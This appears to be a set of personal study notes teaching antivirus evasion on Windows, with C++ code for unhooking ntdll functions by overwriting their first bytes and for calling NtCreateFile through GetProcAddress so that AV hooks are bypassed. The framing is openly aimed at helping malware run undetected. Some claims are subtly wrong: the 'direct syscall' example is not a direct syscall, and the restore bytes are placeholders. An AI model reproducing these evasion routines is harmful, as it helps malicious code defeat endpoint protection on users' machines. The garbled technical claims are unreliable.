# Index 
- [[7. Advanced Techniques]]
	- [[7.1 Code Reuse (API Unhooking and Windows Code Reuse)]]
	- [[7.2 Syscall Usage (Direct System Calls)]]
	- [[7.3 In-memory Execution (Reflective DLL Injection)]]
	- [[7.4 In-memory Execution of Shellcode (Payload Execution)]]
	- [[7.5 Reflective DLL Injection]]
	- [[7.6 Evading Dynamic Analysis (Anti-VM and Anti-Sandbox Techniques)]]

# API Unhooking

#### Understanding API Hooking

Antivirus (AV) software and monitoring tools often use API hooking as a mechanism to monitor and intercept suspicious activities within a program. For example, they hook key functions like `WriteProcessMemory`, `CreateProcess`, `VirtualAlloc`, or `NtCreateFile` to detect malware-like behavior.

Hooking is often done by:
1. Modifying function pointers: The antivirus modifies the memory address of specific function calls in libraries such as `ntdll.dll` or `kernel32.dll` so that they point to the AV’s own code.
2. Injecting jumps (jmp instructions): A common hooking method is overwriting the start of a target function with a jump to the AV’s monitoring routine.

#### Steps to Unhook APIs

Unhooking APIs involves restoring the original behavior of the function. Here's a step-by-step breakdown of how to achieve this:

##### Step 1: Get the Base Address of the DLL
   - Each hooked API resides in a system DLL (e.g., `kernel32.dll`, `ntdll.dll`). The first step is to get the base address of the relevant DLL.
   - Use `GetModuleHandle` to retrieve the base address.

   ```cpp
   HMODULE hModule = GetModuleHandle(L"ntdll.dll"); // or kernel32.dll
   ```

##### Step 2: Retrieve the Original Function Address
   - Once you have the base address, you can use `GetProcAddress` to get the address of the function within the DLL (e.g., `NtCreateFile`, `VirtualAllocEx`).

   ```cpp
   void* pFunction = GetProcAddress(hModule, "NtCreateFile");
   ```

##### Step 3: Restore the Original Bytes
   - The AV might have replaced the first few bytes of the API function with a jump to its own code. You need to restore the original bytes.
   - This can be done by copying the original bytes from a clean version of the system DLL (e.g., from disk) or using known function signatures.

   Example of restoring the original bytes:

   ```cpp
   DWORD oldProtect;
   VirtualProtect(pFunction, 5, PAGE_EXECUTE_READWRITE, &oldProtect);

   // Restore the original bytes (typically obtained from a clean copy of the DLL or from the official documentation)
   memcpy(pFunction, "\x4C\x8B\xD1\xB8", 5);  // Example bytes for restoring a function

   VirtualProtect(pFunction, 5, oldProtect, &oldProtect);
   ```

##### Step 4: Re-run the Function
   - Now that the API function is restored to its original state, the AV no longer intercepts it. This allows your code to execute without interference.

   Full Code Example:
   ```cpp
   #include <windows.h>
   #include <iostream>

   void UnhookAPI() {
       // Step 1: Get the handle of ntdll.dll
       HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

       if (hNtdll) {
           // Step 2: Retrieve the address of NtCreateFile
           void* pNtCreateFile = GetProcAddress(hNtdll, "NtCreateFile");

           if (pNtCreateFile) {
               // Step 3: Restore the original bytes of NtCreateFile (replace the hook)
               DWORD oldProtect;
               VirtualProtect(pNtCreateFile, 5, PAGE_EXECUTE_READWRITE, &oldProtect);

               // Example: Restore the first 5 bytes of NtCreateFile function
               memcpy(pNtCreateFile, "\x4C\x8B\xD1\xB8", 5);  // Replace with the correct original bytes

               // Step 4: Protect the memory again
               VirtualProtect(pNtCreateFile, 5, oldProtect, &oldProtect);
           }
       }
   }

   int main() {
       UnhookAPI();  // Example unhooking call
       std::cout << "NtCreateFile unhooked successfully" << std::endl;
       return 0;
   }
   ```

#### Challenges
- Finding the Original Bytes: It’s difficult to know what the original bytes were without access to a clean copy of the DLL or detailed knowledge of the API’s implementation. You can map a fresh version of the DLL in memory from disk or use reverse engineering tools to identify the correct bytes.
  
- Dynamic Hooks: AV software may re-hook APIs dynamically. This means that even after unhooking, the AV might hook the API again. Periodic checks or more complex unhooking routines can counter this behavior.

# Windows Code Reuse

Instead of calling the standard WinAPI functions (which may be hooked or monitored by AV software), you can reuse legitimate Windows code in creative ways to achieve your goals without triggering alarms.

#### Key Techniques

1. Direct System Calls:
   - The Windows API is a higher-level wrapper around lower-level system calls (syscalls) in the NT kernel. By skipping the API layer and invoking syscalls directly, you can avoid AV detection.

   Steps to Use Direct Syscalls:
   - Syscalls can vary across Windows versions. You’ll need to dynamically determine the syscall numbers or use version-specific syscall numbers.
   - Implementing direct syscalls requires the use of inline assembly or manual creation of a system call wrapper in C.

   Example:
   ```cpp
   #include <windows.h>

   typedef NTSTATUS (NTAPI* pNtCreateFile)(
       PHANDLE FileHandle,
       ACCESS_MASK DesiredAccess,
       POBJECT_ATTRIBUTES ObjectAttributes,
       PIO_STATUS_BLOCK IoStatusBlock,
       PLARGE_INTEGER AllocationSize,
       ULONG FileAttributes,
       ULONG ShareAccess,
       ULONG CreateDisposition,
       ULONG CreateOptions,
       PVOID EaBuffer,
       ULONG EaLength
   );

   void DirectSyscall() {
       HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
       pNtCreateFile NtCreateFile = (pNtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
       
       HANDLE fileHandle;
       OBJECT_ATTRIBUTES objAttr;
       IO_STATUS_BLOCK ioStatus;
       
       // Initialize OBJECT_ATTRIBUTES and other parameters here
       NTSTATUS status = NtCreateFile(&fileHandle, FILE_GENERIC_WRITE, &objAttr, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
       
       if (status == 0) {
           CloseHandle(fileHandle);
       }
   }
   ```

   Benefits:
   - AVs usually focus on API-level behavior, making syscalls a less frequently monitored attack vector.
   - Direct syscall usage can bypass API hooking mechanisms.

2. Custom Shellcode within Legitimate Processes:
   - Instead of relying on suspicious-looking payloads, malware can dynamically build shellcode by reusing code from legitimate processes.
   - This makes it more difficult for AVs to distinguish between normal and malicious activities.

#### Manual Function Invocation (e.g., using NtCreateFile without using WinAPI)

Instead of using higher-level APIs like `CreateFile`, you can directly invoke `NtCreateFile`, a lower-level function in the Windows kernel. Since AV software typically hooks the high-level APIs, this method can help bypass detection.

Example: Manual Invocation of `NtCreateFile`:
```cpp
#include <windows.h>
#include <winternl.h>  // For NTSTATUS and other NT-related definitions

typedef NTSTATUS(NTAPI* pNtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

void ManualNtCreateFile() {
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    pNtCreateFile NtCreateFile = (pNtCreateFile)GetProcAddress(ntdll, "NtCreateFile");

    if (NtCreateFile) {
        HANDLE fileHandle;
        OBJECT_ATTRIBUTES objAttr;
        IO_STATUS_BLOCK ioStatus;
        UNICODE_STRING filePath;

        RtlInitUnicodeString(&filePath, L"\\??\\C:\\temp\\malicious_file.txt");
        InitializeObjectAttributes(&objAttr, &filePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

        // Call the low-level NtCreateFile function
        NTSTATUS status = NtCreateFile(
            &fileHandle,
            FILE_GENERIC_WRITE,
            &objAttr,
            &ioStatus,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_CREATE,
            FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );

        if (status == 0) {
            // File created successfully
            CloseHandle(fileHandle);
        }
    }
}
```

#### Avoiding Common AV Hooks

- Reimplementing Critical APIs: By manually invoking critical functions, you avoid AV hooks.
- Syscall Wrapping: Wrapping syscalls with your custom functions ensures minimal interaction with user-mode APIs.
- Dynamic Function Loading: Instead of linking directly to functions at compile time, dynamically resolve functions at runtime using `GetProcAddress`, further obfuscating your code's intention.